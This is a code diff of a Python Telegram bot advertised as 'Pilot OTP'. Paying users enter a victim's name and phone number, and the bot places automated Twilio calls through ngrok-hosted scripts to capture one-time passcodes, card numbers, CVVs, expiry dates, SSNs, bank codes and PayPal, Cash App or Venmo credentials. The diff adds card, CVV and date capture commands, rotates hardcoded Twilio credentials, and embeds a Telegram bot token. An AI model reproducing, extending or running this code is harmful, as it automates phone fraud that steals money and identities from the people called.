@@ -7,11 +7,11 @@ import json
 import requests
 while True:
   try:
-    account_sid = 'AC4c3c793eac842346cef4820e46501295'
+    account_sid = 'ACfa3e0cef474b5cca23924c9d72190908'
     callid = None
-    auth_token = '27ac8193bae177474d54c0fc4421578c'
-    from_number = '+15076691829'
-    status_callback_url = 'https://fdaf-100-0-165-141.ngrok.io/call/status'
+    auth_token = '636f830ec546c457f132cee78873141f'
+    from_number = '+15076186053'
+    status_callback_url = 'https://9676-100-0-165-141.ngrok.io/call/status'
     telegram_bot_token = '6096442307:AAEoN0VodeJjvtmwOQzFKBqKQRMBG75wh-M'
     telegram_bot = telebot.TeleBot(telegram_bot_token)
     @telegram_bot.message_handler(commands=['cashapp'])
@@ -40,7 +40,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
         )
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
@@ -74,7 +74,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -97,22 +97,7 @@ while True:
             telegram_bot.reply_to(message, 'Please specify the name and phone number to call, e.g. /vbv John +1234567189')
             return
         name, to_number = command_args
-        
-        # Create the Twilio call
-        client = Client(account_sid, auth_token)
-        call = client.calls.create(
-            machine_detection='Enable',
-            to=to_number,
-            status_callback=status_callback_url+f"?chanid={message.chat.id}",
-            from_=from_number,
-            status_callback_event=['Completed'],
-            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/vbv?name={name}&chanid={message.chat.id}')
-        button_text = "Hangup"
-        button_data = f'hangup {call.sid}'
-        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
-        keyboard = types.InlineKeyboardMarkup().add(button)
-        message_text = "📞 Call Ringing"
-        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
+    
     @telegram_bot.message_handler(commands=['venmo'])
     def paypal_command(message):
         try:
@@ -138,7 +123,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/venmo?name={name}&chanid={message.chat.id}')
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/venmo?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -171,7 +156,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -203,7 +188,103 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
+        button_text = "Hangup"
+        button_data = f'hangup {call.sid}'
+        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
+        keyboard = types.InlineKeyboardMarkup().add(button)
+        message_text = "📞 Call Ringing"
+        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
+    @telegram_bot.message_handler(commands=['cvv'])
+    def bank_command(message):
+        try:
+            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
+            if r.text == "200":
+                pass
+            else:
+                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
+                return
+        except:
+            print("SERVER 505 ERROR")
+        command_args = message.text.split()[1:]
+        if len(command_args) != 3:
+            telegram_bot.reply_to(message, 'Please specify the name, phone number, and card name to call, e.g. /cvv John +1234567890 visa-gold-card')
+            return
+        name, to_number, card = command_args
+        
+        # Create the Twilio call
+        client = Client(account_sid, auth_token)
+        call = client.calls.create(
+            machine_detection='Enable',
+            to=to_number,
+            status_callback=status_callback_url+f"?chanid={message.chat.id}",
+            from_=from_number,
+            status_callback_event=['Completed'],
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/cvv?name={name}&chanid={message.chat.id}&card={card}')
+        button_text = "Hangup"
+        button_data = f'hangup {call.sid}'
+        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
+        keyboard = types.InlineKeyboardMarkup().add(button)
+        message_text = "📞 Call Ringing"
+        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
+    @telegram_bot.message_handler(commands=['date'])
+    def bank_command(message):
+        try:
+            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
+            if r.text == "200":
+                pass
+            else:
+                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
+                return
+        except:
+            print("SERVER 505 ERROR")
+        command_args = message.text.split()[1:]
+        if len(command_args) != 3:
+            telegram_bot.reply_to(message, 'Please specify the name, phone number, and card name to call, e.g. /date John +1234567890 visa-gold-card')
+            return
+        name, to_number, card = command_args
+        
+        # Create the Twilio call
+        client = Client(account_sid, auth_token)
+        call = client.calls.create(
+            machine_detection='Enable',
+            to=to_number,
+            status_callback=status_callback_url+f"?chanid={message.chat.id}",
+            from_=from_number,
+            status_callback_event=['Completed'],
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/date?name={name}&chanid={message.chat.id}&card={card}')
+        button_text = "Hangup"
+        button_data = f'hangup {call.sid}'
+        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
+        keyboard = types.InlineKeyboardMarkup().add(button)
+        message_text = "📞 Call Ringing"
+        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
+    @telegram_bot.message_handler(commands=['card'])
+    def bank_command(message):
+        try:
+            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
+            if r.text == "200":
+                pass
+            else:
+                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
+                return
+        except:
+            print("SERVER 505 ERROR")
+        command_args = message.text.split()[1:]
+        if len(command_args) != 3:
+            telegram_bot.reply_to(message, 'Please specify the name, phone number, and card name to call, e.g. /card John +1234567890 visa-gold-card')
+            return
+        name, to_number, card = command_args
+        
+        # Create the Twilio call
+        client = Client(account_sid, auth_token)
+        call = client.calls.create(
+            machine_detection='Enable',
+            to=to_number,
+            status_callback=status_callback_url+f"?chanid={message.chat.id}",
+            from_=from_number,
+            status_callback_event=['Completed'],
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/card?name={name}&chanid={message.chat.id}&card={card}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -236,7 +317,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            url=f'https://9676-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -247,12 +328,12 @@ while True:
     def help_command(message):
         button_text = "Buy"
         button_data = 'buying'
-        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
+        button = types.InlineKeyboardButton(text=button_text, url="https://pilot.sellpass.io/")
         button_text2 = "Server"
         button_data2 = 'server'
         button2 = types.InlineKeyboardButton(text=button_text2, callback_data=button_data2)
         keyboard = types.InlineKeyboardMarkup().add(button).add(button2)
-        message_text = "✈️ Pilot OTP\n\n🤖 Core Commands\n• 📖~ /help | view commands\n• 🎧~/setvoice | set language\n• ⏰~/plan | display your current plan\n\n📱Call Commands\n• 🔐~/otp | Capture OTP\n• 💳~/card | Capture Card Numbers\n• 💳~/cvv | Capture CVV\n• 💳~/vbv | Capture vbv\n• 📅~/date | Capture expiration date\n• 🪪~/ssn | Capture SSN\n• 🎉~/speak | Say any Text\n\n 🔗 Premade Commands\n• 🅿️~/paypal | Capture paypal\n• 💵~/cashapp | Capture Cashapp\n• 🏦~/bank | Capture 6 digit Bank Code\n• 📤~/venmo | Captures Venmo"
+        message_text = "✈️ Pilot OTP\n\n🤖 Core Commands\n• 📖~ /help | view commands\n• ⏰~/plan | display your current plan\n\n📱Call Commands\n• 🔐~/otp | Capture OTP\n• 💳~/card | Capture Card Numbers\n• 💳~/cvv | Capture CVV\n• 💳~/vbv | Capture vbv\n• 📅~/date | Capture expiration date\n• 🪪~/ssn | Capture SSN\n\n 🔗 Premade Commands\n• 🅿️~/paypal | Capture paypal\n• 💵~/cashapp | Capture Cashapp\n• 🏦~/bank | Capture 6 digit Bank Code\n• 📤~/venmo | Captures Venmo"
         telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard,parse_mode= 'Markdown')
     @telegram_bot.message_handler(commands=['plan'])
     def plan_command(message):
